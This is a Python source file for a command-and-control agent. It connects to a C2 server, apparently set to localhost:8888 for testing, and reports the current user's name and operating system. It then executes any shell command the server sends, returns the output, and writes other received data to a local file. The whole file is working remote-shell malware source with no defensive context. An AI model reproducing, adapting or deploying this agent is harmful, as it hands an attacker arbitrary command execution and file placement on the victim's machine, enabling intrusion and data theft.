import socket
import subprocess
import platform
import getpass


def execute_command(command):
    try:
        output = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT)
        return output.decode("utf-8")
    except Exception as e:
        return str(e)


def save_received_file(data, file_name):
    try:
        with open(file_name, "wb") as f:
            f.write(data.encode("utf-8"))
        return "File saved successfully"
    except Exception as e:
        return str(e)


def main():
    host = "127.0.0.1"
    port = 8888

    try:
        username = getpass.getuser()
        client_os = platform.system()
        agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        agent_socket.connect((host, port))
        print("\nConnected to C2 server as:", username)
        agent_socket.send(username.encode("utf-8"))
        agent_socket.send(client_os.encode("utf-8"))

        while True:
            data = agent_socket.recv(4096).decode("utf-8").strip()

            if not data:
                continue

            if data.startswith("CMD:"):
                command = data[len("CMD:"):]

                if command.lower() == "exit":
                    break

                output = execute_command(command)
                agent_socket.send(output.encode("utf-8"))
            else:
                output = save_received_file(data, "received_file")
                agent_socket.send(output.encode("utf-8"))

        print("\nClosing connection to C2 server")
        agent_socket.close()
    except Exception as e:
        print(f"\nError: {e}")


if __name__ == "__main__":
    main()
